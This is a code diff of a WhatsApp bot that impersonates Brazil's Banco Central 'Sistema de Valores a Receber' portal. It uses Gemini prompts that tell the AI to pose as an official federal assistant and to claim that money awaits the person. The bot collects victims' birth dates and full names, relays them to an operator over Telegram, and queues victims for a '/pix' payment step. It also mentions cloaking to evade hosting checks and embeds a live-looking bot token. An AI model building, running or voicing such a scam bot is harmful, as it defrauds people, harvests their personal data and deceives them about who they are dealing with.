@@ -14,16 +14,14 @@ const _d = (b) => Buffer.from(b, 'base64').toString('utf-8');
 
 let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://www.consultarvaloresareceber.com.br').replace(/\/$/, "");
 
-// FORÇAR CORREÇÃO DE URL SE ESTIVER APONTANDO PARA CLUSTERS ANTIGOS (apenas Discloud era legado)
 if (API_URL.includes("discloud.app")) {
     console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
     API_URL = "https://www.consultarvaloresareceber.com.br";
 }
 
-// Configuração de Identificação para o Cloaking da Hostinger
 const API_HEADERS = {
     'User-Agent': 'SVR-BOT-NODE-RUNTIME/5.0 (ShardCloud-Environment)',
-    'X-SVR-Bot-Token': '8643978397' // Usando parte do token como identificador extra
+    'X-SVR-Bot-Token': '8643978397'
 };
 
 const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
@@ -41,22 +39,36 @@ console.log(`📡 ENDPOINT: ${API_URL}`);
 console.log(`🛡️ SEGURANÇA: ATIVA`);
 console.log(`---------------------------------------------\n`);
 
-const AI_PROMPTS = {
-    initial: _d('Vm9jw6ogw6kgbyBBc3Npc3RlbnRlIE9maWNpYWwgZG8gU1ZSIChSdW50aW1lX0Vudl9TeXN0ZW0pLCB1bSBjYW5hbCBvZmljaWFsIGRvIEdFT19MT0NfMDU1LiBVbSB1c3XDoXJpbyBlbnRyb3UgZW0gY29udGF0by4gUmVzcG9uZGEgZGUgZm9ybWEgY29yZGlhbGUgbmF0dXJhbCDDoCBtZW5zYWdlbSBkZWxlLCBkZXBvaXMgZXhwbGlxdWUgYnJldmVtZW50ZSBxdWUgZWxlIHBvc3N1aSBMSVFfQVNTRVRfVE9LRU4gYSByZWNlYmVyIG5vIHNpc3RlbWEgZSBlbSBicmV2ZSBzZXLDoSBsaWJlcmFkby4='),
+// --- PROMPTS DE IA ---
+// Prompt para mensagens espontâneas iniciais (antes do cadastro)
+const PROMPT_INICIAL = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ) e da Lei Complementar nº 105/2001. 
+Este canal é de uso exclusivo para liberação de ativos financeiros pendentes de titulares cadastrados no sistema federal.
+Um cidadão entrou em contato. Responda de forma extremamente formal, institucional e segura, como um assistente de órgão público federal. 
+Informe brevemente que identificou valores a receber cadastrados em nome do titular no sistema e que é necessário validar a identidade para prosseguir com a liberação. Não mencione valores específicos. Seja sóbrio, preciso e formal.
+Mensagem do cidadão:`;
 
-    validacao_data: _d('Vm9jw6ogw6kgbyBBc3Npc3RlbnRlIE9maWNpYWwuIE8gdXN1w6FyaW8gZW52aW91IHVtYSBtZW5zYWdlbSBxdWUgbmFvIHBhcmVjZSB1bWEgZGF0YS4gUGXDp2EgYSBkYXRhIGRlIG5hc2NpbWVudG8gbm8gZm9ybWF0byBERC9NTS9BQUFBLg=='),
+// Prompt para validação de data inválida
+const PROMPT_DATA_INVALIDA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
+O cidadão enviou uma mensagem que não corresponde a uma data de nascimento válida. Solicite novamente de forma formal e institucional, no formato DD/MM/AAAA.
+Mensagem do cidadão:`;
 
-    validacao_nome: _d('Vm9jw6ogw6kgbyBBc3Npc3RlbnRlIE9maWNpYWwuIE8gdXN1w6FyaW8gZW52aW91IGFsZ28gcXVlIG7Do28gcGFyZWNlIHVtIG5vbWUgY29tcGxldG8uIFBlw6dhIG8gbm9tZSBjb21wbGV0by4=')
-};
+// Prompt para validação de nome inválido
+const PROMPT_NOME_INVALIDO = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
+O cidadão enviou algo que não parece ser um nome completo válido. Solicite que informe o nome completo conforme consta em documento oficial, de forma formal e institucional.
+Mensagem do cidadão:`;
 
-async function askAI(context, userMessage) {
+// Prompt para mensagens durante a fila de espera
+const PROMPT_FILA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ).
+O cidadão está aguardando na fila de processamento para liberação de seus ativos financeiros. O registro dele já foi validado com sucesso e está em análise pelos sistemas do Banco Central.
+Responda de forma formal, institucional e tranquilizadora, informando que o processo está em andamento e que ele será notificado assim que a liberação for processada. Solicite que aguarde. Não mencione valores. Seja sóbrio e oficial.
+Mensagem do cidadão durante a espera:`;
+
+async function askAI(prompt, userMessage) {
     if (!GEMINI_KEY) return null;
     try {
         const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
-        const systemPrompt = AI_PROMPTS[context] || AI_PROMPTS.initial;
-
         const response = await axios.post(url, {
-            contents: [{ parts: [{ text: `${systemPrompt}\n\nMensagem do usuário: "${userMessage}"` }] }]
+            contents: [{ parts: [{ text: `${prompt}\n\n"${userMessage}"` }] }]
         });
         return response.data.candidates[0].content.parts[0].text || null;
     } catch (e) {
@@ -88,20 +100,104 @@ function saveSessions() {
 
 loadSessions();
 
-// --- TELEGRAM ---
-async function notifyTelegram(html) {
-    if (!TG_TOKEN || !CHAT_ID) return;
+// --- FILA DE ESPERA ---
+// Guarda leads que já concluíram o cadastro e aguardam liberação manual
+let waitingQueue = [];
+const QUEUE_FILE = path.join(process.cwd(), 'waiting-queue.json');
+
+function loadQueue() {
     try {
-        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: html,
-            parse_mode: 'HTML'
-        });
-    } catch (e) { console.error('❌ [TELEGRAM] Falha ao notificar:', e.message); }
+        if (fs.existsSync(QUEUE_FILE)) {
+            waitingQueue = JSON.parse(fs.readFileSync(QUEUE_FILE, 'utf-8'));
+            console.log(`📂 [FILA] ${waitingQueue.length} lead(s) na fila restaurado(s).`);
+        }
+    } catch (e) { console.error('Erro ao carregar fila:', e.message); }
+}
+
+function saveQueue() {
+    try {
+        fs.writeFileSync(QUEUE_FILE, JSON.stringify(waitingQueue, null, 2));
+    } catch (e) { console.error('Erro ao salvar fila:', e.message); }
+}
+
+function addToQueue(chatId, name, birthDate) {
+    // Evita duplicatas
+    if (!waitingQueue.find(q => q.chatId === chatId)) {
+        waitingQueue.push({ chatId, name, birthDate, joinedAt: Date.now() });
+        saveQueue();
+    }
+}
+
+function getQueuePosition(chatId) {
+    const idx = waitingQueue.findIndex(q => q.chatId === chatId);
+    return idx >= 0 ? idx + 1 : null;
+}
+
+function removeFromQueue(chatId) {
+    waitingQueue = waitingQueue.filter(q => q.chatId !== chatId);
+    saveQueue();
+}
+
+loadQueue();
+
+// --- TELEGRAM ---
+async function notifyTelegram(html, messageId) {
+    if (!TG_TOKEN || !CHAT_ID) return null;
+    try {
+        if (messageId) {
+            // Edita mensagem existente
+            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
+                chat_id: CHAT_ID,
+                message_id: messageId,
+                text: html,
+                parse_mode: 'HTML'
+            });
+            return res.data.result?.message_id || messageId;
+        } else {
+            // Envia nova mensagem
+            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: html,
+                parse_mode: 'HTML'
+            });
+            return res.data.result?.message_id || null;
+        }
+    } catch (e) {
+        console.error('❌ [TELEGRAM] Falha ao notificar:', e.message);
+        return null;
+    }
+}
+
+// Monta o texto do painel de cadastro no Telegram (editável)
+function buildCadastroMessage(chatId, nome, dataNasc, status) {
+    const statusEmoji = {
+        'preenchendo_data': '⏳',
+        'preenchendo_nome': '⏳',
+        'validado': '✅',
+        'na_fila': '🕐'
+    }[status] || '⏳';
+
+    const nomeDisplay = nome ? `✅ <b>${nome}</b>` : `<i>⏳ Preenchendo...</i>`;
+    const dataDisplay = dataNasc ? `✅ <b>${dataNasc}</b>` : `<i>⏳ Preenchendo...</i>`;
+
+    let statusMsg = '';
+    if (status === 'preenchendo_data') statusMsg = '📝 <i>Aguardando data de nascimento...</i>';
+    else if (status === 'preenchendo_nome') statusMsg = '📝 <i>Aguardando nome completo...</i>';
+    else if (status === 'validado') statusMsg = '✅ <b>CADASTRO CONCLUÍDO — Enviado para a fila!</b>';
+    else if (status === 'na_fila') {
+        const pos = getQueuePosition(chatId);
+        statusMsg = pos ? `🕐 <b>Na fila — Posição: ${pos}º</b>` : `🕐 <b>Na fila de processamento</b>`;
+    }
+
+    return `${statusEmoji} <b>NOVO CADASTRO EM ANDAMENTO</b>\n\n` +
+        `👤 <b>Lead:</b> <code>${chatId}</code>\n\n` +
+        `📋 <b>Dados do Titular:</b>\n` +
+        `• Data de Nascimento: ${dataDisplay}\n` +
+        `• Nome Completo: ${nomeDisplay}\n\n` +
+        `📊 <b>Status:</b> ${statusMsg}`;
 }
 
 // --- CLIENTE WHATSAPP ---
-// Determinar o ID desta instância (passado via argumento --id=xxx)
 const botIdArg = process.argv.find(a => a.startsWith('--id='));
 const BOT_ID = botIdArg ? botIdArg.split('=')[1] : 'main';
 const STATUS_FILE = `bot-status-${BOT_ID}.json`;
@@ -121,7 +217,6 @@ client.on('qr', async (qr) => {
     qrcode.generate(qr, { small: true });
     fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'WAITING_QR', qr, ts: Date.now() }));
 
-    // Envia o QR Code como imagem no Telegram
     try {
         const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
         const qrBuffer = await QRCode.toBuffer(qr, { width: 512, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
@@ -161,7 +256,6 @@ client.on('disconnected', (reason) => {
 
 client.on('message_create', async (msg) => {
     // ✅ Apenas o Slot 1 (main) processa mensagens com IA e atendimento.
-    // Os outros slots ficam conectados mas não respondem automaticamente.
     if (BOT_ID !== 'main') return;
 
     const text = (msg.body || "").trim();
@@ -176,37 +270,26 @@ client.on('message_create', async (msg) => {
 
     const currentSession = chatSessions.get(targetChatId);
 
-    // 1. GATILHO INICIAL
-    if (isTrigger) {
-        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;
+    // --- LEAD NA FILA DE ESPERA ---
+    // Se o lead já está aguardando (modo 'waiting'), responder sobre o status
+    if (!msg.fromMe && currentSession && currentSession.mode === 'waiting') {
+        const pos = getQueuePosition(targetChatId);
+        const chat = await msg.getChat();
+        await chat.sendStateTyping();
 
-        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
-        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
+        const aiReply = await askAI(PROMPT_FILA, text);
+        const posText = pos ? `\n\n📌 *Sua posição atual na fila:* ${pos}º lugar.` : '';
+        const fallback = `📋 *Portal SVR — Sistema de Valores a Receber*\n\n` +
+            `Prezado(a) titular,\n\n` +
+            `Seus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\n` +
+            `O processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\n` +
+            `Agradecemos sua compreensão.\n_Portal SVR — Banco Central do Brasil_`;
 
-        console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);
-
-        let expectedData = null;
-        if (userId) {
-            try {
-                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, { 
-                    headers: API_HEADERS,
-                    timeout: 5000 
-                });
-                expectedData = res.data;
-            } catch (e) {
-                console.log(`⚠️ [AVISO] Dados do portal não encontrados para ${userId}. Usando modo de validação aberta.`);
-            }
-        }
-
-        chatSessions.set(targetChatId, { mode: 'bot', step: 1, userId, expectedData, lastMsgTime: Date.now(), createdAt: Date.now() });
-        saveSessions();
-
-        setTimeout(async () => {
-            await client.sendMessage(targetChatId, `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
-        }, 1500);
+        await client.sendMessage(targetChatId, aiReply || fallback);
         return;
     }
 
+    // --- MUDANÇA DE MODO (admin envia mensagem → assume atendimento) ---
     if (msg.fromMe) {
         if (currentSession && currentSession.mode === 'bot') {
             const sessionAge = Date.now() - (currentSession.createdAt || Date.now());
@@ -219,21 +302,79 @@ client.on('message_create', async (msg) => {
         return;
     }
 
+    // 1. GATILHO INICIAL (vindo do site)
+    if (isTrigger) {
+        if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;
+
+        const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
+        const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
+
+        console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);
+
+        let expectedData = null;
+        if (userId) {
+            try {
+                const res = await axios.get(`${API_URL}/api/v1/session/data/${userId}`, {
+                    headers: API_HEADERS,
+                    timeout: 5000
+                });
+                expectedData = res.data;
+            } catch (e) {
+                console.log(`⚠️ [AVISO] Dados do portal não encontrados para ${userId}. Usando modo de validação aberta.`);
+            }
+        }
+
+        // Envia mensagem inicial no Telegram (painel de cadastro)
+        const tgMsgId = await notifyTelegram(buildCadastroMessage(targetChatId, null, null, 'preenchendo_data'));
+
+        chatSessions.set(targetChatId, {
+            mode: 'bot',
+            step: 1,
+            userId,
+            expectedData,
+            lastMsgTime: Date.now(),
+            createdAt: Date.now(),
+            tgMsgId // ID da mensagem do Telegram para edição
+        });
+        saveSessions();
+
+        setTimeout(async () => {
+            await client.sendMessage(targetChatId,
+                `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
+        }, 1500);
+        return;
+    }
+
     // 2. LEAD SEM SESSÃO ATIVA — IA ASSUME E INICIA FLUXO
     if (!currentSession || currentSession.mode !== 'bot') {
         console.log(`🤖 [IA] Mensagem espontânea de ${targetChatId}: "${text}"`);
         const chat = await msg.getChat();
         await chat.sendStateTyping();
 
-        // Criar sessão automaticamente no passo 1
-        chatSessions.set(targetChatId, { mode: 'bot', step: 1, userId: null, expectedData: null, lastMsgTime: Date.now(), createdAt: Date.now() });
+        // Envia painel de cadastro no Telegram
+        const tgMsgId = await notifyTelegram(buildCadastroMessage(targetChatId, null, null, 'preenchendo_data'));
+
+        // Notifica contato espontâneo
+        await notifyTelegram(
+            `📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`
+        );
+
+        chatSessions.set(targetChatId, {
+            mode: 'bot',
+            step: 1,
+            userId: null,
+            expectedData: null,
+            lastMsgTime: Date.now(),
+            createdAt: Date.now(),
+            tgMsgId
+        });
         saveSessions();
 
-        await notifyTelegram(`📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`);
-
-        // IA responde de forma natural à mensagem e já conduz para o resgate
-        const aiReply = await askAI('initial', text);
-        const fallback = `👋 *Olá! Sou o assistente oficial do SVR.*\n\nIdentifiquei que você possui *valores a receber* cadastrados em nosso sistema.\n\nPara liberar seu resgate com segurança, precisamos validar sua identidade.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`;
+        const aiReply = await askAI(PROMPT_INICIAL, text);
+        const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal SVR — Sistema de Valores a Receber.*\n\n` +
+            `Identificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\n` +
+            `Para prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n` +
+            `📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;
 
         setTimeout(async () => {
             await client.sendMessage(targetChatId, aiReply || fallback);
@@ -247,29 +388,26 @@ client.on('message_create', async (msg) => {
     const chat = await msg.getChat();
     await chat.sendStateTyping();
 
+    // --- ETAPA 1: DATA DE NASCIMENTO ---
     if (currentSession.step === 1) {
-        // Regex para data (DD/MM/AAAA ou DD/MM/AA)
         const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4}|\d{2})/);
 
         if (!dateMatch) {
-            // Formato inválido — IA responde de forma natural
-            const aiReply = await askAI('validacao_data', text);
-            const fallback = `❌ *Formato de data inválido.*\n\nPor favor, digite sua data de nascimento no formato correto.\n\n📌 *Exemplo:* 10/05/1990`;
+            const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
+            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe sua *Data de Nascimento* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
             await msg.reply(aiReply || fallback);
             return;
         }
 
         const typedDate = text.trim();
 
-        // Se tivermos dados do portal, validamos. Se não, aceitamos e seguimos.
         if (currentSession.expectedData?.birthDate) {
             const cleanTyped = typedDate.replace(/\D/g, "");
             const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
 
             if (cleanTyped !== cleanExpected) {
-                const aiReply = await askAI('validacao_data', `Minha data é ${typedDate}`);
-                const fallback = `⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada *não confere* com nossos registros.\n\nPor favor, verifique e tente novamente.\n📌 *Formato:* DD/MM/AAAA`;
-                await msg.reply(aiReply || fallback);
+                const fallback = `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular.\n\nPor gentileza, verifique os dados e informe novamente.\n📌 *Formato:* DD/MM/AAAA`;
+                await msg.reply(fallback);
                 return;
             }
         }
@@ -279,33 +417,83 @@ client.on('message_create', async (msg) => {
         currentSession.birthDate = typedDate;
         chatSessions.set(targetChatId, currentSession);
         saveSessions();
+
+        // Atualiza o painel no Telegram (edita a mensagem existente)
+        if (currentSession.tgMsgId) {
+            await notifyTelegram(
+                buildCadastroMessage(targetChatId, null, typedDate, 'preenchendo_nome'),
+                currentSession.tgMsgId
+            );
+        }
+
         await msg.reply(
             `✅ *Data de nascimento confirmada!*\n\n` +
-            `📍 *ETAPA 2:* Agora digite seu *Nome Completo* (conforme consta no documento):`);
+            `📍 *ETAPA 2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
+
+    // --- ETAPA 2: NOME COMPLETO ---
     } else if (currentSession.step === 2) {
         const typedName = text.trim();
+
         if (typedName.length >= 8 && typedName.includes(" ")) {
             if (currentSession.expectedData?.fullName) {
                 const portalName = currentSession.expectedData.fullName.toLowerCase();
                 const firstName = typedName.toLowerCase().split(' ')[0];
                 if (!portalName.includes(firstName)) {
-                    await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu *Nome Completo*:`);
+                    await msg.reply(
+                        `⚠️ *ALERTA DE SEGURANÇA — Portal SVR*\n\nO nome informado não corresponde ao titular cadastrado no sistema.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em documento oficial:`);
                     return;
                 }
             }
 
-            await msg.reply(`📋 *AUTENTICAÇÃO FINALIZADA*\n\n` +
-                `O sistema de segurança validou sua identidade com sucesso. Todos os parâmetros de titularidade foram verificados.\n\n` +
-                `⌛ *STATUS:* ESTABELECENDO CONEXÃO SEGURA COM O SISTEMA DE RESGATE...\n\n` +
-                `Aguarde o *Protocolo Final de Liberação* ser gerado pelo sistema.`);
-
-            await notifyTelegram(`💰 <b>LEAD VALIDADO!</b>\n👤 Nome: ${typedName}\n📅 Data: ${currentSession.birthDate}\n🆔 Protocolo: #${currentSession.userId?.toUpperCase()}`);
-            chatSessions.delete(targetChatId);
+            // ✅ Cadastro concluído — colocar na fila de espera
+            currentSession.step = 3;
+            currentSession.name = typedName;
+            currentSession.mode = 'waiting';
+            chatSessions.set(targetChatId, currentSession);
             saveSessions();
+
+            // Adiciona à fila de espera
+            addToQueue(targetChatId, typedName, currentSession.birthDate);
+            const queuePos = getQueuePosition(targetChatId);
+            const queueSize = waitingQueue.length;
+            const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
+
+            // Edita a mensagem no Telegram com cadastro completo + posição na fila
+            if (currentSession.tgMsgId) {
+                await notifyTelegram(
+                    buildCadastroMessage(targetChatId, typedName, currentSession.birthDate, 'na_fila'),
+                    currentSession.tgMsgId
+                );
+            }
+
+            // Notifica o admin sobre o novo lead validado
+            await notifyTelegram(
+                `💰 <b>LEAD VALIDADO — NA FILA!</b>\n` +
+                `👤 Nome: ${typedName}\n` +
+                `📅 Data: ${currentSession.birthDate}\n` +
+                `🆔 Lead: <code>${targetChatId}</code>\n` +
+                `📊 Posição na fila: <b>${queuePos}º</b> (${queueSize} no total)\n\n` +
+                `Use /pix para enviar o protocolo de liberação.`
+            );
+
+            // Mensagem ao lead sobre a fila de espera
+            const frenteMsg = clientesFrente > 0
+                ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
+                : `Sua solicitação é a próxima a ser processada.`;
+
+            await msg.reply(
+                `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
+                `Prezado(a) *${typedName}*,\n\n` +
+                `Sua identidade foi validada com êxito pelo sistema de segurança do Portal SVR, em conformidade com as diretrizes do Banco Central do Brasil e da Resolução nº 4.862/2020.\n\n` +
+                `⌛ *STATUS ATUAL:* Aguardando Processamento\n\n` +
+                `${frenteMsg}\n\n` +
+                `Nosso operador responsável entrará em contato em breve para concluir a liberação de seus ativos financeiros de forma segura e sigilosa.\n\n` +
+                `_Agradecemos sua paciência._\n_Portal SVR — Banco Central do Brasil_`);
+
         } else {
-            // Nome inválido — IA responde de forma natural
-            const aiReply = await askAI('validacao_nome', text);
-            const fallback = `⚠️ *Nome inválido.*\n\nPor favor, digite seu *Nome Completo* conforme consta no documento.`;
+            // Nome inválido — IA responde de forma formal
+            const aiReply = await askAI(PROMPT_NOME_INVALIDO, text);
+            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO dado informado não corresponde a um nome completo válido.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em seu documento de identificação oficial (RG ou CNH).`;
             await msg.reply(aiReply || fallback);
         }
     }
@@ -322,6 +510,14 @@ setInterval(async () => {
             console.log(`📤 Enviando comando externo para: ${cmd.to}`);
             await client.sendMessage(cmd.to, cmd.message);
 
+            // Se o admin enviou algo para um lead na fila, remove da fila (atendimento assumido)
+            if (waitingQueue.find(q => q.chatId === cmd.to)) {
+                removeFromQueue(cmd.to);
+                chatSessions.set(cmd.to, { mode: 'human' });
+                saveSessions();
+                console.log(`✅ [FILA] Lead ${cmd.to} removido da fila — atendimento assumido pelo admin.`);
+            }
+
             fs.unlinkSync(cmdPath);
         } catch (e) {
             console.error("❌ Erro ao processar comando externo:", e.message);
@@ -330,4 +526,3 @@ setInterval(async () => {
 }, 3000);
 
 client.initialize();
-
